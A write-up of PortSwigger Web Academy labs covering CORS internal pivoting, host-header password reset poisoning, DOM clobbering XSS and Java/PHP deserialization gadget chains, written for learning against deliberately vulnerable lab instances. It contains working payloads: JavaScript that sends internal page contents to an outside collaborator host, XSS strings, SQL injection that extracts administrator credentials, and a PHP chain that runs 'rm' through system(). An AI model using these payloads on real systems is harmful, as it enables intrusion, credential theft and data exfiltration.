---
title: PortSwigger Web Academy
description: Write-up of PortSwigger Web Academy challenges.
ignore_macros: true
---

# PortSwigger Web Academy

## CORS

### Insecure CORS allows internal network attacks

> Lab: [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

**Goal:** Craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user.

We can enumerate the internal network using a for loop and send it to the victim using the exploit server :

```js
for (let i = 0; i < 256; i++) {
	let req = new XMLHttpRequest();
	req.onload = handleResponse;
	req.open('GET', `http://192.168.0.${i}:8080`, true);
	req.send();

	function handleResponse() {
		fetch(`https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com/?match=${i}`);
	};
}
```

On the collaborator, we receive a match on ID `6` (`GET /?match=6`), this tells us that we have an http application on `http://192.168.0.6:8080`.

Now, let's exfiltrate the internal website using POST request.

```js
let req = new XMLHttpRequest();
req.onload = handleResponse;
req.open("GET", "http://192.168.0.6:8080", true);
req.send();

function handleResponse() {
	fetch("https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com?exfil", {
		method: "POST",
		body: "data=" + btoa(this.responseText)
	});
};
```

We successfully obtain a response on collaborator :

```
POST /?exfil HTTP/1.1
Host: 1mo5n4kj374a7w34vjvumn0k0b62u0ip.oastify.com
...
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36
Referer: http://exploit-0ab200d2035fb2dec40dfaec017f0012.exploit-server.net/

data=PCFET0NUWVBFIGh0...
```

I tried the same payload with `withCredentials` set to `true`, but we get no response. So, we can guess that `Access-Control-Allow-Credentials` is not allowed. I tried to exfiltrate the CORS policy of the internal web application using the function [getAllResponseHeaders](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/getAllResponseHeaders) but this function only returns the content of the following response header : `Cache-Control Content-Language Content-Type Expires Last-Modified Pragma` (from [stackoverflow.com](https://stackoverflow.com/a/14689355/11428808)).

The internal app contains a POST form to login, if we add the parameters in the query, they will be reflected on the form. For example, with the query `/login?username=XYZ_CANARY_XYZ`, we will obtain the following form :

```html
<form class=login-form method=POST action=/login>
    <input required type="hidden" name="csrf" value="Pr4ytojxkMioFjrlPJ0W0UTAdQ8N9YjW">
    <label>Username</label>
    <input required type=username name="username" value="XYZ_CANARY_XYZ">
    <label>Password</label>
    <input required type=password name="password">
    <button class=button type=submit> Log in </button>
</form>
```

The `username` parameter is vulnerable to XSS :

```js
const collabUrl = "https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com"; 
const data = "username=" + encodeURIComponent(`X"><img src="${collabUrl}/img"><p div="`);
let req = new XMLHttpRequest();
req.onload = exfilResponse;
req.open("GET", "http://192.168.0.6:8080/login?" + data, true);
req.send();

function exfilResponse() {
	fetch(`${collabUrl}?exfil`, {
		method: "POST",
		body: "body=" + btoa(this.responseText)
	});
}
```

The injection seems to work :

```html
<!-- [...] -->
<label>Username</label>
<input required type=username name="username" value="X"><img src="https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com/img"><p div="">
<!-- [...] -->
```

We can verify it by making the user visit the reflected XSS link :

```js
const collabUrl = "https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com"; 
const data = "username=" + encodeURIComponent(`X"><img src="${collabUrl}/img"><p div="`);
document.location.href="http://192.168.0.6:8080/login?" + data;
```

We receive a hit on `/img`, the XSS works ! Now let's try to exfiltrate the content as a logged user (victim account) using an `iframe` as we cannot use `withCredentials`. 

```js
const data = "username=" + encodeURIComponent(`"><iframe src="/" onload="new Image().src='https://rrmydfoifg9zafyfe9hpcsrm4da4yumj.oastify.com?body=' + btoa(this.contentWindow.document.body.innerHTML)"><p div="`);
document.location.href="http://192.168.0.6:8080/login?" + data;
```

We receive a hit : `GET /?body=CiAgICAgICAgICAgIDxzY...`. The bot is logged as admin and we have a form to delete a user :

```html
<!-- [...] -->
<form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
    <input required="" type="hidden" name="csrf" value="iTW8O0qE5PM3uPmfs8culvp3jsdLYdn6">
    <label>Username</label>
    <input required="" type="text" name="username">
    <button class="button" type="submit">Delete user</button>
</form>
<!-- [...] -->
```

Here is the final exploit that insert the username `carlos` and submit the form.

```js
const data = "username=" + encodeURIComponent(`"><iframe src="/" onload="let form=this.contentWindow.document.getElementsByClassName('login-form')[0];form.username.value='carlos';form.submit();"><p div="`);
document.location.href="http://192.168.0.6:8080/login?" + data;
```

The lab is solved !

## HTTP Host Header attacks

### Password leak via dangling markup

> Lab: [Password reset poisoning via dangling markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

A normal password reset will send the following email to the user :

```
Hello!

Please click here (https://xxx.web-security-academy.net/login) to login with your new password: D7c0EJwAWM

Thanks,
Support team
This email has been scanned by the MacCarthy Email Security service
```

We can inject the host header in the password reset request to modify the link inside the email :

```
POST /forgot-password HTTP/1.1
Host: xxx.web-security-academy.net:CANARY1337 // <- here
```

We now have the following link : `https://xxx.web-security-academy.net:CANARY1337/login`

Let's try to leak the password using dangling markup :

```
POST /forgot-password HTTP/1.1
Host: xxx.web-security-academy.net:"></a><a href="https://exploit-xxx.exploit-server.net/#
```

Then, we receive the password on our exploit server because the antivirus or the victim clicked on the malicious link :

```
10.0.3.209      2022-12-09 17:29:37 +0000 "GET /#/login'>click+here</a>+to+login+with+your+new+password:+ld92i9hv1e</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i> HTTP/1.1" 404 
```

You can now login into the carlos account with `carlos:ld92i9hv1e`.

## DOM Clobbering

### DOM clobbering to bypass DOMPurify

> Lab: [Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)

Snippet of the vulnerable code:

```js
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
divImgContainer.innerHTML = avatarImgHTML
```

The goal is to inject the variable named `window.defaultAvatar` (and `window.defaultAvatar.avatar`) in order to exploit the `innerHTML` function.

Inside the [DOMPurify/src/regexp.js](https://github.com/cure53/DOMPurify/blob/2.0.15/src/regexp.js) file, we can see that different schemes are ALLOWED (encoded double-quote will be decoded at runtime).

```js
export const IS_ALLOWED_URI = seal(
  /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i // eslint-disable-line no-useless-escape
);
```

Using the scheme `cid` or `tel` with a string as content will throw an error and then run the javascript `onerror` event. So let's try to create an image like this:

```html
<img class="avatar" src="tel:notanumber" onerror="alert(1337)">
```

To do this, we can use DOM Clobbering on the comment section that allows users to put HTML, here is some valid payloads:

```html
<a id="defaultAvatar"></a>
<a id="defaultAvatar" name="avatar" href="cid:notanumber&quot; onerror=&quot;alert(1337)"></a>

<!-- or -->
<a id="defaultAvatar"></a>
<a id="defaultAvatar" name="avatar" href="cid:notanumber&quot; onerror=alert(1337)//"></a>

<!-- or -->
<a id="defaultAvatar"></a>
<a id="defaultAvatar" name="avatar" href="tel:notanumber&quot; onerror=alert(1337)//"></a>
```

In the developer console:

```js
> window.defaultAvatar
HTMLCollection(2) [a#defaultAvatar, a#defaultAvatar, defaultAvatar: a#defaultAvatar, avatar: a#defaultAvatar]
> window.defaultAvatar.avatar
<a href=​"cid:​notanumber" onerror="alert(1337)​" name=​"avatar" id=​"defaultAvatar">​</a>​
> ""+window.defaultAvatar.avatar
'cid:notanumber" onerror="alert(1337)'
```

The `defaultAvatar` is successfully injected and the XSS is working!

### DOM clobbering to bypass HTMLJanitor

> Lab: [Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

Snippet of the vulnerable code:

```js
// Sanitize attributes
for (var a = 0; a < node.attributes.length; a += 1) {
    var attr = node.attributes[a];

    if (shouldRejectAttr(attr, allowedAttrs, node)) {
        node.removeAttribute(attr.name);
        // Shift the array to continue looping.
        a = a - 1;
    }
}
```

You can use a `form` HTML element to inject the `attributes` attribute of any variables (in our example: `node`).

```html
<form id="anchor" tabindex="0" onfocus="print()">
    <input id="attributes">
</form>

<!-- Use an iframe to auto trigger the XSS: -->
<iframe src=https://0adf000f0387fa22c0ae1d2a00da005b.web-security-academy.net/post?postId=10
    onload="setTimeout(()=>this.src=this.src + '#anchor',500)">
```

As you can see, the `node.attributes` is equals to the `input` element and the `node.attributes.length` variable is equals to `undefined` :

```html
> node
<form id=​"anchor" tabindex=​"0" onfocus=​"print()​">​...​</form>​
> node.attributes
<input id=​"attributes">​
> node.attributes.length
undefined
```

This bypass the `HTMLJanitor` filter and trigger the XSS thanks to the `onfocus` event and the `iframe` that focus the anchor.

## Insecure deserialization

### Custom gadget chain for Java deserialization

> Lab: [Developing a custom gadget chain for Java deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

**1.** Source code leaks via backup file :

- /backup/AccessTokenUser.java
- /backup/ProductTemplate.java

```java
package data.session.token;
// ...

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    // ...
}
```

```java
package data.productcatalog;
// ...

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    // ...
}
```

- The `readObject` from `ProductTemplate` is vulnerable to SQL injection.
- Our session cookie is a serialized instance of `AccessTokenUser`.

**2.** Inject the session cookie with a serialized instance of `ProductTemplate` to extract the administrator's credentials.

```bash
$ mkdir -p data/productcatalog
$ mv ProductTemplate.java data/productcatalog/
$ javac data/productcatalog/ProductTemplate.java && \
    java -classpath . 'data/productcatalog/ProductTemplate'
ProductTemplate serialized !
$ base64 /tmp/product.ser -w0 | sed 's/=/%3D/g'
rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQABHRvdG8%3D
```

**3.** Inject a single quote inside the SQL query to test the SQL injection.

```java
// ...

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;

    public static void main(String[] args) {
            ProductTemplate prod = new ProductTemplate("'");

            try {
                    FileOutputStream fileOut = new FileOutputStream("/tmp/product.ser");
                    ObjectOutputStream out = new ObjectOutputStream(fileOut);
                    out.writeObject(prod);
                    out.close();
                    fileOut.close();
            } catch (IOException i) {
                    i.printStackTrace();
            }

            System.out.println("ProductTemplate serialized !");
    }
}
```

```html
$ curl -s 'https://0aa0005c04509f21c0decf2f00a600a1.web-security-academy.net/my-account' \
    -b "session=$(base64 /tmp/product.ser -w0 | sed 's/=/%3D/g')" \
    | grep 'Internal Server Error' -A 1
<h4>Internal Server Error</h4>
<p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException:
ERROR: unterminated quoted string at or near &quot;&apos;&apos;&apos; LIMIT 1&quot;
```

The SQL injection is working !

**4.** To extract the administrator's credentials, we need to :

- Enumerate the number of columns with NULL parameter (count = 8)
- Find a reflected column
- Cast VARCHAR to INTEGER (due to the type of the query)

SQL injection :

```java
ProductTemplate prod = new ProductTemplate("1' UNION SELECT NULL,NULL,NULL,CAST (username||':'||password AS integer),NULL,NULL,NULL,NULL FROM users --");
```

Result :

```html
<h4>Internal Server Error</h4>
<p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException:
ERROR: invalid input syntax for type integer: &quot;administrator:snncluoa4gd5o83oz315&quot;</p>
```

Credentials : `administrator:snncluoa4gd5o83oz315`

### Custom gadget chain for PHP deserialization

> Lab: [Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

**1.** Source code leaks via backup file :

- /cgi-bin/libs/CustomTemplate.php~

```php
class CustomTemplate {
    // ...

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class DefaultMap {
    // ...

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
```

**2.** Create serialization payload

```php
<?php

class CustomTemplate {}
class Product {}
class Description {}
class DefaultMap {}

$defaultMap = new DefaultMap();
$defaultMap->callback = "system";

$customTemplate = new CustomTemplate();
$customTemplate->desc = $defaultMap;
$customTemplate->default_desc_type = "rm /home/carlos/morale.txt";

echo serialize($customTemplate);
```

**3.** Execute it via cookie

```bash
$ php xpl.php
O:14:"CustomTemplate":2:{s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";}%
$ php xpl.php | base64 -w0 | sed 's/=/%3D/g'
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6NDoiZGVzYyI7TzoxMDoiRGVmYXVsdE1hcCI6MTp7czo4OiJjYWxsYmFjayI7czo2OiJzeXN0ZW0iO31zOjE3OiJkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30%3D
$ curl 'https://0ae800d704396245c019105e00b3005d.web-security-academy.net/' -b "session=$(php xpl.php | base64 -w0 | sed 's/=/%3D/g')"
```

### PHAR deserialization & custom gadget chain

> Lab : [Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)

**1.** Source code leaks via directory listing and backup file :

- /cgi-bin/CustomTemplate.php~
- /cgi-bin/Blog.php~

```php
class Blog {
    // ...

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }
}

class CustomTemplate {
    // ...

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}
```

- *Blog* `__wakeup()` - setup SSTI payload
- *CustomTemplate* `__destruct()` -> `lockFilePath()` -> *Blog* `__toString()` - run SSTI payload

**2.** Create an unserialize payload to trigger the Twig SSTI

```php
$blog = new Blog('toto',
    '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("<SEHLL_COMMAND>")}}');
$object = new CustomTemplate($blog);
```

**3.** Create a polyglot phar/jpeg file thanks to [xanhacks/phar-jpg-polyglot](https://gitlab.com/xanhacks/phar-jpg-polyglot/).

**4.** Upload malicious phar as avatar picture.

**5.** Load/execute it by visiting `/cgi-bin/avatar.php?avatar=phar://wiener`